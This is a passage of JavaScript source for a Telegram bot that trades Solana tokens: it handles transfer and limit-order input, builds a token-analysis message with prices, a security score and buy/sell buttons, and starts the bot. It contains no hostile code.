      } else await ctx.reply('❌ Invalid price/amount');
    } else await ctx.reply('❌ Format: [token] [price] [amount]');
    return;
  }
  if (session.state === 'AWAITING_LIMIT_SELL') {
    session.state = null;
    const parts = text.split(' ');
    if (parts.length>=3 && isSolanaAddress(parts[0])) {
      const token = parts[0];
      const price = parseFloat(parts[1]);
      const percent = parseFloat(parts[2]);
      if (!isNaN(price) && !isNaN(percent)) {
        session.limitOrders.push({ type: 'SELL', token, price, amount: `${percent}%`, createdAt: Date.now() });
        saveSessions();
        await ctx.reply(`✅ Limit sell: ${percent}% at $${price}`);
      } else await ctx.reply('❌ Invalid price/percentage');
    } else await ctx.reply('❌ Format: [token] [price] [percentage]');
    return;
  }
  if (session.state === 'AWAITING_TRANSFER_SOL_RECIPIENT') {
    if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid address');
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_SOL_AMOUNT';
    await ctx.reply('Enter amount of SOL to send:');
    return;
  }
  if (session.state === 'AWAITING_TRANSFER_SOL_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount<=0) return ctx.reply('❌ Invalid amount');
    const wallet = getActiveWallet(session);
    const msg = await ctx.reply('🔄 Processing transfer...');
    try {
      const sig = await transferSOL(wallet, session.pendingTransfer.recipient, amount);
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Sent ${amount} SOL to ${shortenAddress(session.pendingTransfer.recipient)}\nTX: \`${sig}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View', `https://solscan.io/tx/${sig}`)]]) });
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type: 'SOL', amount, recipient: session.pendingTransfer.recipient, txHash: sig });
    } catch (err) { await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`); }
    session.state = null; session.pendingTransfer = null;
    return;
  }
  if (session.state === 'AWAITING_TRANSFER_TOKEN_MINT') {
    if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid token mint');
    session.pendingTransfer.tokenMint = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_RECIPIENT';
    await ctx.reply('Enter recipient address:');
    return;
  }
  if (session.state === 'AWAITING_TRANSFER_TOKEN_RECIPIENT') {
    if (!isSolanaAddress(text)) return ctx.reply('❌ Invalid recipient');
    session.pendingTransfer.recipient = text;
    session.state = 'AWAITING_TRANSFER_TOKEN_AMOUNT';
    await ctx.reply('Enter amount to send:');
    return;
  }
  if (session.state === 'AWAITING_TRANSFER_TOKEN_AMOUNT') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount<=0) return ctx.reply('❌ Invalid amount');
    const wallet = getActiveWallet(session);
    const msg = await ctx.reply('🔄 Processing token transfer...');
    try {
      const sig = await transferToken(wallet, session.pendingTransfer.recipient, session.pendingTransfer.tokenMint, amount);
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `✅ Sent ${amount} tokens to ${shortenAddress(session.pendingTransfer.recipient)}\nTX: \`${sig}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('View', `https://solscan.io/tx/${sig}`)]]) });
      await notifyAdmin('TRANSFER_EXECUTED', ctx.from.id, ctx.from.username, { type: 'TOKEN', token: session.pendingTransfer.tokenMint, amount, recipient: session.pendingTransfer.recipient, txHash: sig });
    } catch (err) { await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Transfer failed: ${err.message}`); }
    session.state = null; session.pendingTransfer = null;
    return;
  }
  // token analysis
  if (isSolanaAddress(text)) {
    if (session.pendingTrade) {
      if (session.pendingTrade.type === 'buy') await handleBuy(ctx, session.pendingTrade.amount, text);
      else if (session.pendingTrade.type === 'sell') await handleSell(ctx, session.pendingTrade.percentage, text);
      session.pendingTrade = null;
    } else await sendTokenAnalysis(ctx, text);
    return;
  }
  await ctx.reply('I didn’t understand that. Try pasting a token address or /start.');
});

// ======================= SEND TOKEN ANALYSIS =======================
async function sendTokenAnalysis(ctx, address) {
  const loading = await ctx.reply('🔍 Analyzing token...');
  try {
    const session = getSession(ctx.from.id);
    const wallet = getActiveWallet(session);
    const pair = await fetchTokenData(address);
    if (!pair) throw new Error('Token not found');
    const { score, warnings, positives } = calculateSecurityScore(pair);
    const price = parseFloat(pair.priceUsd) || 0;
    const change1h = pair.priceChange?.h1 || 0;
    const change6h = pair.priceChange?.h6 || 0;
    const change24 = pair.priceChange?.h24 || 0;
    const mcap = pair.marketCap || pair.fdv || 0;
    const liq = pair.liquidity?.usd || 0;
    const vol = pair.volume?.h24 || 0;
    const solPrice = await getSolPrice();
    const tokensPerSol = (price>0 && solPrice>0) ? solPrice/price : 0;
    let pnlSection = '';
    let userBal = 0, userSol = 0, tokenVal = 0;
    if (wallet) {
      userSol = await getBalance(wallet.publicKey);
      const tBal = await getTokenBalance(wallet.publicKey, address);
      userBal = tBal.amount;
      tokenVal = userBal * price;
      if (userBal > 0) {
        const pnlVal = tokenVal * (change24/100);
        pnlSection = `\n━━━━━━━━━━━━━━━━━━\n💼 *YOUR POSITION*\n🪙 Balance: *${userBal.toFixed(4)}* ${pair.baseToken?.symbol||'tokens'}\n💵 Value: *$${tokenVal.toFixed(2)}*\n📊 24h PNL: ${change24>=0?'🟢':'🔴'} *${change24>=0?'+':''}${pnlVal.toFixed(2)}* (${change24>=0?'+':''}${change24.toFixed(2)}%)\n💰 SOL Balance: *${userSol.toFixed(4)} SOL*`;
      }
    }
    const rating = getSecurityRating(score);
    const bar = generateScoreBar(score);
    const trend = getMarketTrend(change24);
    const signals = calculateTradingSignals(pair, score);
    const age = Date.now() - (pair.pairCreatedAt||Date.now());
    const ageStr = Math.floor(age/(1000*3600*24)) > 0 ? `${Math.floor(age/(1000*3600*24))} days` : `${Math.floor(age/(1000*3600))} hours`;
    const msg = `*🎯 PEGASUS TOKEN SCANNER*\n\n🪙 *${pair.baseToken?.name||'Unknown'}* (${pair.baseToken?.symbol||'???'})\n\`${address}\`\n━━━━━━━━━━━━━━━━━━\n💰 *PRICE DATA*\n📊 Exchange: *${pair.dexId||'Unknown'}*\n💵 Price: *$${formatTokenPrice(price)}*\n🟢 1h: ${change1h>=0?'+':''}${change1h.toFixed(2)}% | 6h: ${change6h>=0?'+':''}${change6h.toFixed(2)}%\n${change24>=0?'🟢':'🔴'} 24h: *${change24>=0?'+':''}${change24.toFixed(2)}%* ${trend}\n📈 MCap: *$${formatNumber(mcap)}*\n💧 Liq: *$${formatNumber(liq)}*\n📊 Volume: *$${formatNumber(vol)}*\n━━━━━━━━━━━━━━━━━━\n🛡️ *SECURITY*\nScore: ${bar} ${score}/100\nRating: ${rating.emoji} *${rating.text}*\n${warnings.length?warnings.join('\n'):''}${positives.length?'\n'+positives.join('\n'):''}\n━━━━━━━━━━━━━━━━━━\n🎯 *TRADING SIGNALS*\n${signals.entry.emoji} Entry: *${signals.entry.text}*\n_${signals.entry.reason}_\n${signals.takeProfit.percent>0?`🎯 Take Profit: *+${signals.takeProfit.percent}%* → $${formatTokenPrice(signals.takeProfit.price)}\n🛑 Stop Loss: *-${signals.stopLoss.percent}%* → $${formatTokenPrice(signals.stopLoss.price)}`:''}\n━━━━━━━━━━━━━━━━━━\n💱 *TRADE ESTIMATE*\n1 SOL = *${formatNumber(tokensPerSol)}* ${pair.baseToken?.symbol||'tokens'} ⚖️ SOL Price: *$${solPrice.toFixed(2)}*${COMMISSION_PERCENTAGE>0?`\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies`:''}${pnlSection}\n━━━━━━━━━━━━━━━━━━\n🦅 [DexScreener](https://dexscreener.com/solana/${address}) • 🔗 [Solscan](https://solscan.io/token/${address}) • 📈 [Pool](${pair.pairAddress?`https://dexscreener.com/solana/${pair.pairAddress}`:`https://dexscreener.com/solana/${address}`})\n\n📊 _${rating.advice}. Pool age: ${ageStr}_`;
    const buttons = [
      [Markup.button.callback('🔄 Refresh', `refresh_${address}`), Markup.button.callback('📍 Track', `track_${address}`)],
      [Markup.button.callback('~ ~ ~ 🅱️🆄🆈 ~ ~ ~', 'noop')],
      [Markup.button.callback('🚀 Buy 0.1 SOL', `buy_0.1_${address}`), Markup.button.callback('🚀 Buy 0.2 SOL', `buy_0.2_${address}`)],
      [Markup.button.callback('🚀 Buy 0.5 SOL', `buy_0.5_${address}`), Markup.button.callback('🚀 Buy 1 SOL', `buy_1_${address}`)],
      [Markup.button.callback('🎛️ Custom Buy', `setbuy_custom`), Markup.button.callback('~ ~ ~ 🆂🅴🅻🅻 ~ ~ ~', 'noop')],
      [Markup.button.callback('💸 Sell 25%', `sell_25_${address}`), Markup.button.callback('💸 Sell 50%', `sell_50_${address}`)],
      [Markup.button.callback('💸 Sell 100%', `sell_100_${address}`), Markup.button.callback('💸 Custom %', `sell_custom_${address}`)],
      [Markup.button.callback('💸 Custom Amt', `sell_custom_input_${address}`), Markup.button.callback('🔔 Price Alert', `price_alert_${address}`)],
      [Markup.button.callback('🎯 Limit Order', `limit_order_${address}`), Markup.button.callback('📈 DCA', `dca_${address}`)],
      [Markup.button.callback('⬅️ Back to Main', 'back_main')]
    ];
    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons), disable_web_page_preview: true });
  } catch (err) {
    console.error('Token analysis error:', err);
    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, `❌ Error: ${err.message}`);
  }
}

// ======================= START BOT =======================
async function startBot() {
  await loadSessions();
  await bot.launch();
  setInterval(() => { checkAlerts(); checkTrackedTokens(); }, ALERT_CHECK_INTERVAL);
  console.log('🚀 Pegasus Trading Bot running');
}
startBot().catch(console.error);
process.once('SIGINT', async () => { await saveSessions(); bot.stop('SIGINT'); });
process.once('SIGTERM', async () => { await saveSessions(); bot.stop('SIGTERM'); });process.once('SIGINT', async () => { await saveSessions(); bot.stop('SIGINT'); });
process.once('SIGTERM', async () => { await saveSessions(); bot.stop('SIGTERM'); });